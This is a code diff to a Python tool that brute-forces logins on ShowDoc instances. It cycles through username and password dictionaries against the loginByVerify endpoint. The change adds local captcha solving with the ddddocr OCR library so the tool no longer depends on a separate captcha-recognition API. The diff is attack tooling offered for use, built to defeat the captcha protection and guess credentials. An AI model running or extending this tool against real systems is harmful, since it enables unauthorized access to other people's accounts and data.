@@ -4,6 +4,7 @@ import base64
 import time
 import sys
 import argparse
+import ddddocr
 from colorama import Fore, init
 
 
@@ -15,7 +16,7 @@ parser = argparse.ArgumentParser()
 parser.add_argument('-t', type=str, help="showdoc地址(例如：http://showdoc.demo.com/)", default="")
 parser.add_argument('-u', type=str, help="用户名字典(例如：username.txt)", default="user.txt")
 parser.add_argument('-p', type=str, help="密码字典(例如：password.txt)", default="pass.txt")
-parser.add_argument('-c', type=str, help="captcha识别api地址", default="http://127.0.0.1:8888/")
+parser.add_argument('-c', type=str, help="captcha识别api地址", default="")
 args = parser.parse_args()
 
 
@@ -103,6 +104,17 @@ def showdoc_captcha_code(captcha_api, captcha_b64):
         return captcha_code
 
 
+def showdoc_captcha_code_local(captcha_b64):
+    ocr = ddddocr.DdddOcr()
+    try:
+        img_bytes = base64.b64decode(captcha_b64)
+        captcha_code = ocr.classification(img_bytes)[0:10]
+    except:
+        return 'request error'
+    else:
+        return captcha_code
+
+
 def showdoc_login(showdoc_url, username, password, captcha_id, captcha_code):
     login_url = f'{showdoc_url}/server/index.php?s=/api/user/loginByVerify'
     header = req_header(url=showdoc_url)
@@ -153,7 +165,10 @@ def showdoc_login_main(showdoc_url, username, password, captcha_api_url):
                 exit_num = 0
                 break
         while True:
-            captcha_code = showdoc_captcha_code(captcha_api_url, captcha_base64)
+            if captcha_api_url == '':
+                captcha_code = showdoc_captcha_code_local(captcha_base64)
+            else:
+                captcha_code = showdoc_captcha_code(captcha_api_url, captcha_base64)
             if captcha_code == 'request error':
                 print(Fore.RED + '\n[-] 验证码解码失败!')
                 logger(filename='error.log', io_type='a', string=f'[{showdoc_url}/][{int(time.time())}] captcha code error!{username}:{password}\n')
